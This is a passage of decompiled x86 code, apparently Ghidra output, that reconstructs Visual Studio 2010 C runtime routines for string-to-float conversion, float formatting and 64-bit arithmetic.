  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_003c05b6:
  iVar2 = terminate_if_debugger_present
                    (local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,in_stack_ffffffd4);
  return iVar2;
}



// Library Function - Multiple Matches With Different Base Names
//  __atodbl_l
//  __atoflt_l
// 
// Library: Visual Studio 2010 Release

int __cdecl FID_conflict___atoflt_l(_CRT_FLOAT *_Result,char *_Str,_locale_t _Locale)

{
  INTRNCVT_STATUS IVar1;
  int iVar2;
  undefined4 extraout_EDX;
  undefined in_stack_ffffffd4;
  localeinfo_struct local_28;
  int local_20;
  char local_1c;
  uint local_18;
  _LDBL12 local_14;
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  _LocaleUpdate::_LocaleUpdate((_LocaleUpdate *)&local_28,_Locale);
  local_18 = ___strgtold12_l(&local_14,(char **)&stack0xffffffd4,_Str,0,0,0,0,(_locale_t)&local_28);
  IVar1 = FID_conflict___ld12tod(&local_14,(_CRT_DOUBLE *)_Result);
  if ((local_18 & 3) == 0) {
    if (IVar1 == INTRNCVT_OVERFLOW) {
LAB_003c061e:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_003c065e;
    }
    if (IVar1 != INTRNCVT_UNDERFLOW) {
LAB_003c0650:
      if (local_1c != '\0') {
        *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
      }
      goto LAB_003c065e;
    }
  }
  else {
    if ((local_18 & 1) == 0) {
      if ((local_18 & 2) == 0) goto LAB_003c0650;
      goto LAB_003c061e;
    }
  }
  if (local_1c != '\0') {
    *(uint *)(local_20 + 0x70) = *(uint *)(local_20 + 0x70) & 0xfffffffd;
  }
LAB_003c065e:
  iVar2 = terminate_if_debugger_present
                    (local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,in_stack_ffffffd4);
  return iVar2;
}



// Library Function - Single Match
//  __fptostr
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __fptostr(char *_Buf,size_t _SizeInBytes,int _Digits,STRFLT _PtFlt)

{
  char *_Str;
  int *piVar1;
  int iVar2;
  char *pcVar3;
  size_t sVar4;
  char cVar5;
  char *pcVar6;
  errno_t eVar7;
  
  pcVar6 = _PtFlt->mantissa;
  if ((_Buf == (char *)0x0) || (_SizeInBytes == 0)) {
    piVar1 = __errno();
    eVar7 = 0x16;
    *piVar1 = 0x16;
  }
  else {
    *_Buf = '\0';
    iVar2 = 0;
    if (0 < _Digits) {
      iVar2 = _Digits;
    }
    if (iVar2 + 1U < _SizeInBytes) {
      _Str = _Buf + 1;
      *_Buf = '0';
      pcVar3 = _Str;
      if (0 < _Digits) {
        do {
          cVar5 = *pcVar6;
          if (cVar5 == '\0') {
            cVar5 = '0';
          }
          else {
            pcVar6 = pcVar6 + 1;
          }
          *pcVar3 = cVar5;
          pcVar3 = pcVar3 + 1;
          _Digits = _Digits + -1;
        } while (0 < _Digits);
      }
      *pcVar3 = '\0';
      if ((-1 < _Digits) && ('4' < *pcVar6)) {
        while (pcVar3 = pcVar3 + -1, *pcVar3 == '9') {
          *pcVar3 = '0';
        }
        *pcVar3 = *pcVar3 + '\x01';
      }
      if (*_Buf == '1') {
        _PtFlt->decpt = _PtFlt->decpt + 1;
      }
      else {
        sVar4 = _strlen(_Str);
        FID_conflict__memcpy(_Buf,_Str,sVar4 + 1);
      }
      return 0;
    }
    piVar1 = __errno();
    eVar7 = 0x22;
    *piVar1 = 0x22;
  }
  FUN_003b60f9();
  return eVar7;
}



// Library Function - Single Match
//  ___dtold
// 
// Library: Visual Studio 2010 Release

void __cdecl ___dtold(uint *param_1,uint *param_2)

{
  ushort uVar1;
  ushort uVar2;
  uint uVar3;
  ushort uVar4;
  uint local_8;
  
  uVar1 = *(ushort *)((int)param_2 + 6) >> 4;
  uVar2 = *(ushort *)((int)param_2 + 6) & 0x8000;
  uVar4 = uVar1 & 0x7ff;
  uVar3 = *param_2;
  local_8 = 0x80000000;
  if ((uVar1 & 0x7ff) == 0) {
    if (((param_2[1] & 0xfffff) == 0) && (uVar3 == 0)) {
      param_1[1] = 0;
      *param_1 = 0;
      goto LAB_003c07ca;
    }
    uVar4 = uVar4 + 0x3c01;
    local_8 = 0;
  }
  else {
    if (uVar4 == 0x7ff) {
      uVar4 = 0x7fff;
    }
    else {
      uVar4 = uVar4 + 0x3c00;
    }
  }
  local_8 = uVar3 >> 0x15 | (param_2[1] & 0xfffff) << 0xb | local_8;
  uVar3 = uVar3 << 0xb;
  while( true ) {
    *param_1 = uVar3;
    param_1[1] = local_8;
    if ((local_8 & 0x80000000) != 0) break;
    local_8 = local_8 * 2 | *param_1 >> 0x1f;
    uVar3 = *param_1 * 2;
    uVar4 = uVar4 - 1;
  }
  uVar2 = uVar2 | uVar4;
LAB_003c07ca:
  *(ushort *)(param_1 + 2) = uVar2;
  return;
}



// Library Function - Single Match
//  __fltout2
// 
// Library: Visual Studio 2010 Release

STRFLT __cdecl __fltout2(_CRT_DOUBLE _Dbl,STRFLT _Flt,char *_ResultStr,size_t _SizeInBytes)

{
  code *pcVar1;
  int iVar2;
  errno_t eVar3;
  STRFLT p_Var4;
  undefined4 extraout_EDX;
  undefined uVar5;
  uint in_stack_ffffffcc;
  uint uStack48;
  ushort uStack44;
  short local_24;
  char local_22;
  char local_20 [24];
  uint local_8;
  
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  ___dtold((uint *)&stack0xffffffcc,(uint *)&_Dbl);
  iVar2 = __I10_OUTPUT(in_stack_ffffffcc,uStack48,uStack44,0x11,0,&local_24);
  uVar5 = (undefined)in_stack_ffffffcc;
  _Flt->flag = iVar2;
  _Flt->sign = (int)local_22;
  _Flt->decpt = (int)local_24;
  eVar3 = _strcpy_s(_ResultStr,_SizeInBytes,local_20);
  if (eVar3 == 0) {
    _Flt->mantissa = _ResultStr;
    p_Var4 = (STRFLT)terminate_if_debugger_present
                               (local_8 ^ (uint)&stack0xfffffffc,extraout_EDX,uVar5);
    return p_Var4;
  }
  __invoke_watson((wchar_t *)0x0,(wchar_t *)0x0,(wchar_t *)0x0,0,0);
  pcVar1 = (code *)swi(3);
  p_Var4 = (STRFLT)(*pcVar1)();
  return p_Var4;
}



// Library Function - Single Match
//  __alldvrm
// 
// Library: Visual Studio 2010 Release

undefined8 __alldvrm(uint param_1,uint param_2,uint param_3,uint param_4)

{
  ulonglong uVar1;
  longlong lVar2;
  uint uVar3;
  int iVar4;
  uint uVar5;
  uint uVar6;
  uint uVar7;
  uint uVar8;
  bool bVar10;
  char cVar11;
  uint uVar9;
  
  cVar11 = (int)param_2 < 0;
  if ((bool)cVar11) {
    bVar10 = param_1 != 0;
    param_1 = -param_1;
    param_2 = -(uint)bVar10 - param_2;
  }
  if ((int)param_4 < 0) {
    cVar11 = cVar11 + '\x01';
    bVar10 = param_3 != 0;
    param_3 = -param_3;
    param_4 = -(uint)bVar10 - param_4;
  }
  uVar3 = param_1;
  uVar5 = param_3;
  uVar6 = param_2;
  uVar9 = param_4;
  if (param_4 == 0) {
    uVar3 = param_2 / param_3;
    iVar4 = (int)(((ulonglong)param_2 % (ulonglong)param_3 << 0x20 | (ulonglong)param_1) /
                 (ulonglong)param_3);
  }
  else {
    do {
      uVar8 = uVar9 >> 1;
      uVar5 = uVar5 >> 1 | (uint)((uVar9 & 1) != 0) << 0x1f;
      uVar7 = uVar6 >> 1;
      uVar3 = uVar3 >> 1 | (uint)((uVar6 & 1) != 0) << 0x1f;
      uVar6 = uVar7;
      uVar9 = uVar8;
    } while (uVar8 != 0);
    uVar1 = CONCAT44(uVar7,uVar3) / (ulonglong)uVar5;
    iVar4 = (int)uVar1;
    lVar2 = (ulonglong)param_3 * (uVar1 & 0xffffffff);
    uVar3 = (uint)((ulonglong)lVar2 >> 0x20);
    uVar5 = uVar3 + iVar4 * param_4;
    if (((CARRY4(uVar3,iVar4 * param_4)) || (param_2 < uVar5)) ||
       ((param_2 <= uVar5 && (param_1 < (uint)lVar2)))) {
      iVar4 = iVar4 + -1;
    }
    uVar3 = 0;
  }
  if (cVar11 == '\x01') {
    bVar10 = iVar4 != 0;
    iVar4 = -iVar4;
    uVar3 = -(uint)bVar10 - uVar3;
  }
  return CONCAT44(uVar3,iVar4);
}



// Library Function - Single Match
//  __aullshr
// 
// Library: Visual Studio 2010 Release

ulonglong __fastcall __aullshr(byte param_1,uint param_2)

{
  uint in_EAX;
  
  if (0x3f < param_1) {
    return 0;
  }
  if (param_1 < 0x20) {
    return CONCAT44(param_2 >> (param_1 & 0x1f),
                    in_EAX >> (param_1 & 0x1f) | param_2 << 0x20 - (param_1 & 0x1f));
  }
  return (ulonglong)(param_2 >> (param_1 & 0x1f));
}



// Library Function - Single Match
//  __controlfp_s
// 
// Library: Visual Studio 2010 Release

errno_t __cdecl __controlfp_s(uint *_CurrentState,uint _NewValue,uint _Mask)

{
  uint uVar1;
  int *piVar2;
  errno_t eVar3;
  
  uVar1 = _Mask & 0xfff7ffff;
  if ((_NewValue & uVar1 & 0xfcf0fce0) == 0) {
    if (_CurrentState == (uint *)0x0) {
      __control87(_NewValue,uVar1);
    }
    else {
      uVar1 = __control87(_NewValue,uVar1);
      *_CurrentState = uVar1;
    }
    eVar3 = 0;
  }
  else {
    if (_CurrentState != (uint *)0x0) {
      uVar1 = __control87(0,0);
      *_CurrentState = uVar1;
    }
    piVar2 = __errno();
    eVar3 = 0x16;
    *piVar2 = 0x16;
    FUN_003b60f9();
  }
  return eVar3;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2010 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  uint uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint in_EDX;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(uint *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_003d77bc;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_003d77b8 - 1;
    iVar14 = (int)(DAT_003d77b8 + ((int)DAT_003d77b8 >> 0x1f & 0x1fU)) >> 5;
    local_24 = DAT_003d77b8 & 0x8000001f;
    if ((int)local_24 < 0) {
      local_24 = (local_24 - 1 | 0xffffffe0) + 1;
    }
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - (char)local_24;
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      local_24 = ~(-1 << (bVar8 & 0x1f));
      uVar11 = local_14[iVar14] & local_24;
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_003c0b12;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_003c0b19;
LAB_003c0b12:
            do {
              bVar4 = true;
LAB_003c0b19:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_003c0b27;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_003c0b27:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_003d77b4 - DAT_003d77b8)) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_003d77b4 < iVar14) {
        if (iVar14 < _DAT_003d77b0) {
          iVar14 = iVar14 + DAT_003d77c4;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_003d77bc + (DAT_003d77bc >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          in_EDX = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if ((int)in_EDX < iVar5) {
              local_14[in_EDX] = 0;
            }
            else {
              local_14[in_EDX] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            in_EDX = in_EDX - 1;
          } while (-1 < (int)in_EDX);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_003d77bc + (DAT_003d77bc >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          in_EDX = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if ((int)in_EDX < iVar5) {
              local_14[in_EDX] = 0;
            }
            else {
              local_14[in_EDX] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            in_EDX = in_EDX - 1;
          } while (-1 < (int)in_EDX);
          iVar14 = DAT_003d77c4 + _DAT_003d77b0;
        }
        goto LAB_003c0ed2;
      }
      iVar13 = DAT_003d77b4 - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_003d77b8 - 1;
      iVar5 = (int)(DAT_003d77b8 + ((int)DAT_003d77b8 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_003d77b8 & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_003c0cc6;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar12 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar2 = local_14[iVar14];
        uVar15 = uVar2 + uVar12;
        if ((uVar15 < uVar2) || (uVar15 < uVar12)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar2 = local_14[iVar14];
          uVar15 = uVar2 + 1;
          bVar4 = false;
          if ((uVar15 < uVar2) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_003c0cc6:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_003d77bc + 1 + (DAT_003d77bc + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      local_24 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if ((int)local_24 < iVar5) {
          local_14[local_24] = 0;
        }
        else {
          local_14[local_24] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        local_24 = local_24 - 1;
      } while (-1 < (int)local_24);
    }
    iVar14 = 0;
    in_EDX = local_24;
  }
LAB_003c0ed2:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_003d77c0 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
    in_EDX = local_14[1];
  }
  else {
    if (DAT_003d77c0 == 0x20) {
      *(uint *)&_D->x = uVar15;
    }
  }
  IVar7 = terminate_if_debugger_present(local_14[3] ^ (uint)&stack0xfffffffc,in_EDX,0);
  return IVar7;
}



// WARNING: Globals starting with '_' overlap smaller symbols at the same address
// Library Function - Multiple Matches With Different Base Names
//  __ld12tod
//  __ld12tof
// 
// Library: Visual Studio 2010 Release

INTRNCVT_STATUS __cdecl FID_conflict___ld12tod(_LDBL12 *_Ifp,_CRT_DOUBLE *_D)

{
  ushort uVar1;
  uint uVar2;
  byte bVar3;
  bool bVar4;
  int iVar5;
  int iVar6;
  INTRNCVT_STATUS IVar7;
  byte bVar8;
  uint *puVar9;
  uint *puVar10;
  uint in_EDX;
  uint uVar11;
  uint uVar12;
  int iVar13;
  int iVar14;
  uint uVar15;
  int iVar16;
  bool bVar17;
  uint local_2c;
  uint local_24;
  uint local_14 [4];
  
  local_14[3] = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  uVar1 = *(ushort *)(_Ifp->ld12 + 10);
  uVar15 = *(uint *)(_Ifp->ld12 + 6);
  local_14[0] = uVar15;
  uVar2 = *(uint *)(_Ifp->ld12 + 2);
  uVar12 = uVar1 & 0x7fff;
  iVar13 = uVar12 - 0x3fff;
  iVar5 = (uint)*(ushort *)_Ifp->ld12 << 0x10;
  local_14[1] = uVar2;
  local_14[2] = iVar5;
  bVar3 = (byte)DAT_003d77d4;
  if (iVar13 == -0x3fff) {
    iVar14 = 0;
    iVar5 = 0;
    do {
      if (local_14[iVar5] != 0) {
        local_14[0] = 0;
        local_14[1] = 0;
        local_14[2] = 0;
        break;
      }
      iVar5 = iVar5 + 1;
    } while (iVar5 < 3);
  }
  else {
    bVar4 = false;
    iVar16 = DAT_003d77d0 - 1;
    iVar14 = (int)(DAT_003d77d0 + ((int)DAT_003d77d0 >> 0x1f & 0x1fU)) >> 5;
    local_24 = DAT_003d77d0 & 0x8000001f;
    if ((int)local_24 < 0) {
      local_24 = (local_24 - 1 | 0xffffffe0) + 1;
    }
    puVar10 = local_14 + iVar14;
    bVar8 = 0x1f - (char)local_24;
    if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
      local_24 = ~(-1 << (bVar8 & 0x1f));
      uVar11 = local_14[iVar14] & local_24;
      iVar6 = iVar14;
      while( true ) {
        if (uVar11 != 0) {
          iVar6 = (int)(iVar16 + (iVar16 >> 0x1f & 0x1fU)) >> 5;
          uVar11 = 1 << (0x1f - ((byte)iVar16 & 0x1f) & 0x1f);
          puVar9 = local_14 + iVar6;
          local_24 = *puVar9 + uVar11;
          if (local_24 < *puVar9) goto LAB_003c1063;
          bVar17 = local_24 < uVar11;
          do {
            bVar4 = false;
            if (!bVar17) goto LAB_003c106a;
LAB_003c1063:
            do {
              bVar4 = true;
LAB_003c106a:
              iVar6 = iVar6 + -1;
              *puVar9 = local_24;
              if ((iVar6 < 0) || (!bVar4)) goto LAB_003c1078;
              puVar9 = local_14 + iVar6;
              local_24 = *puVar9 + 1;
            } while (local_24 < *puVar9);
            bVar17 = local_24 == 0;
          } while( true );
        }
        iVar6 = iVar6 + 1;
        if (2 < iVar6) break;
        uVar11 = local_14[iVar6];
      }
    }
LAB_003c1078:
    *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
    iVar14 = iVar14 + 1;
    if (iVar14 < 3) {
      puVar10 = local_14 + iVar14;
      for (iVar16 = 3 - iVar14; iVar16 != 0; iVar16 = iVar16 + -1) {
        *puVar10 = 0;
        puVar10 = puVar10 + 1;
      }
    }
    iVar14 = iVar13;
    if (bVar4) {
      iVar14 = uVar12 - 0x3ffe;
    }
    if (iVar14 < (int)(DAT_003d77cc - DAT_003d77d0)) {
      local_14[0] = 0;
      local_14[1] = 0;
      local_14[2] = 0;
    }
    else {
      if (DAT_003d77cc < iVar14) {
        if (iVar14 < _DAT_003d77c8) {
          iVar14 = iVar14 + DAT_003d77dc;
          local_14[0] = local_14[0] & 0x7fffffff;
          iVar5 = (int)(DAT_003d77d4 + (DAT_003d77d4 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          in_EDX = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if ((int)in_EDX < iVar5) {
              local_14[in_EDX] = 0;
            }
            else {
              local_14[in_EDX] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            in_EDX = in_EDX - 1;
          } while (-1 < (int)in_EDX);
        }
        else {
          local_14[1] = 0;
          local_14[2] = 0;
          local_14[0] = 0x80000000;
          iVar5 = (int)(DAT_003d77d4 + (DAT_003d77d4 >> 0x1f & 0x1fU)) >> 5;
          bVar8 = bVar3 & 0x1f;
          local_2c = 0;
          local_24 = 0;
          do {
            uVar15 = local_14[local_24];
            local_14[local_24] = uVar15 >> bVar8 | local_2c;
            local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
            local_24 = local_24 + 1;
          } while ((int)local_24 < 3);
          in_EDX = 2;
          puVar10 = local_14 + (2 - iVar5);
          do {
            if ((int)in_EDX < iVar5) {
              local_14[in_EDX] = 0;
            }
            else {
              local_14[in_EDX] = *puVar10;
            }
            puVar10 = puVar10 + -1;
            in_EDX = in_EDX - 1;
          } while (-1 < (int)in_EDX);
          iVar14 = DAT_003d77dc + _DAT_003d77c8;
        }
        goto LAB_003c1423;
      }
      iVar13 = DAT_003d77cc - iVar13;
      local_14[0] = uVar15;
      local_14[1] = uVar2;
      iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = (byte)iVar13 & 0x1f;
      local_14[2] = iVar5;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      iVar5 = 2;
      puVar10 = local_14 + (2 - iVar14);
      do {
        if (iVar5 < iVar14) {
          local_14[iVar5] = 0;
        }
        else {
          local_14[iVar5] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        iVar5 = iVar5 + -1;
      } while (-1 < iVar5);
      iVar13 = DAT_003d77d0 - 1;
      iVar5 = (int)(DAT_003d77d0 + ((int)DAT_003d77d0 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = 0x1f - ((byte)DAT_003d77d0 & 0x1f);
      puVar10 = local_14 + iVar5;
      if ((*puVar10 & 1 << (bVar8 & 0x1f)) != 0) {
        uVar15 = local_14[iVar5] & ~(-1 << (bVar8 & 0x1f));
        iVar14 = iVar5;
        while (uVar15 == 0) {
          iVar14 = iVar14 + 1;
          if (2 < iVar14) goto LAB_003c1217;
          uVar15 = local_14[iVar14];
        }
        iVar14 = (int)(iVar13 + (iVar13 >> 0x1f & 0x1fU)) >> 5;
        bVar4 = false;
        uVar12 = 1 << (0x1f - ((byte)iVar13 & 0x1f) & 0x1f);
        uVar2 = local_14[iVar14];
        uVar15 = uVar2 + uVar12;
        if ((uVar15 < uVar2) || (uVar15 < uVar12)) {
          bVar4 = true;
        }
        local_14[iVar14] = uVar15;
        while ((iVar14 = iVar14 + -1, -1 < iVar14 && (bVar4))) {
          uVar2 = local_14[iVar14];
          uVar15 = uVar2 + 1;
          bVar4 = false;
          if ((uVar15 < uVar2) || (uVar15 == 0)) {
            bVar4 = true;
          }
          local_14[iVar14] = uVar15;
        }
      }
LAB_003c1217:
      *puVar10 = *puVar10 & -1 << (bVar8 & 0x1f);
      iVar5 = iVar5 + 1;
      if (iVar5 < 3) {
        puVar10 = local_14 + iVar5;
        for (iVar13 = 3 - iVar5; iVar13 != 0; iVar13 = iVar13 + -1) {
          *puVar10 = 0;
          puVar10 = puVar10 + 1;
        }
      }
      iVar5 = (int)(DAT_003d77d4 + 1 + (DAT_003d77d4 + 1 >> 0x1f & 0x1fU)) >> 5;
      bVar8 = bVar3 + 1 & 0x1f;
      local_2c = 0;
      local_24 = 0;
      do {
        uVar15 = local_14[local_24];
        local_14[local_24] = uVar15 >> bVar8 | local_2c;
        local_2c = (uVar15 & ~(-1 << bVar8)) << (0x20 - bVar8 & 0x1f);
        local_24 = local_24 + 1;
      } while ((int)local_24 < 3);
      local_24 = 2;
      puVar10 = local_14 + (2 - iVar5);
      do {
        if ((int)local_24 < iVar5) {
          local_14[local_24] = 0;
        }
        else {
          local_14[local_24] = *puVar10;
        }
        puVar10 = puVar10 + -1;
        local_24 = local_24 - 1;
      } while (-1 < (int)local_24);
    }
    iVar14 = 0;
    in_EDX = local_24;
  }
LAB_003c1423:
  uVar15 = iVar14 << (0x1f - bVar3 & 0x1f) | -(uint)((uVar1 & 0x8000) != 0) & 0x80000000 |
           local_14[0];
  if (DAT_003d77d8 == 0x40) {
    *(uint *)((int)&_D->x + 4) = uVar15;
    *(uint *)&_D->x = local_14[1];
    in_EDX = local_14[1];
  }
  else {
    if (DAT_003d77d8 == 0x20) {
      *(uint *)&_D->x = uVar15;
    }
  }
  IVar7 = terminate_if_debugger_present(local_14[3] ^ (uint)&stack0xfffffffc,in_EDX,0);
  return IVar7;
}



// Library Function - Single Match
//  ___strgtold12_l
// 
// Library: Visual Studio 2010 Release

uint __cdecl
___strgtold12_l(_LDBL12 *pld12,char **p_end_ptr,char *str,int mult12,int scale,int decpt,
               int implicit_E,_locale_t _Locale)

{
  bool bVar1;
  bool bVar2;
  bool bVar3;
  ushort uVar4;
  char cVar5;
  ushort uVar6;
  int *piVar7;
  uint uVar8;
  uint uVar9;
  uint uVar10;
  ushort uVar11;
  ushort uVar12;
  undefined4 extraout_EDX;
  char *pcVar13;
  char *pcVar14;
  undefined4 uVar15;
  ushort uVar16;
  int iVar17;
  undefined4 uVar18;
  char *pcVar19;
  ushort *puVar20;
  int iVar21;
  undefined uVar22;
  char *in_stack_ffffff80;
  int local_6c;
  int local_68;
  int *local_64;
  ushort *local_60;
  int local_5c;
  char *local_58;
  int local_54;
  uint local_50;
  undefined2 local_4c;
  undefined2 uStack74;
  undefined2 uStack72;
  undefined2 uStack70;
  int local_44;
  undefined4 local_40;
  ushort local_3c;
  ushort uStack58;
  ushort uStack56;
  ushort local_36;
  byte local_30;
  undefined uStack47;
  ushort uStack46;
  ushort local_2c [4];
  char local_24 [23];
  char local_d;
  uint local_8;
  
  uVar22 = SUB41(in_stack_ffffff80,0);
  local_8 = DAT_003d6664 ^ (uint)&stack0xfffffffc;
  iVar17 = 1;
  pcVar19 = local_24;
  uVar4 = 0;
  local_6c = 1;
  local_50 = 0;
  bVar1 = false;
  bVar3 = false;
  bVar2 = false;
  local_68 = 0;
  local_54 = 0;
